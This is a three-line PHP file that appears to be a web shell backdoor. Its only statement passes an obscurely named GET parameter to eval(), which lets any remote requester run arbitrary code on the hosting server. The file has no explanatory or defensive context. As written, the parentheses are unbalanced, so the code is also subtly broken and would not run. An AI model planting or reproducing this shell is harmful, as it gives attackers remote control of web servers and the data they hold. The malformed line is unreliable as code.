<?php
eval(($_GET['OPttzJKy']);
?>
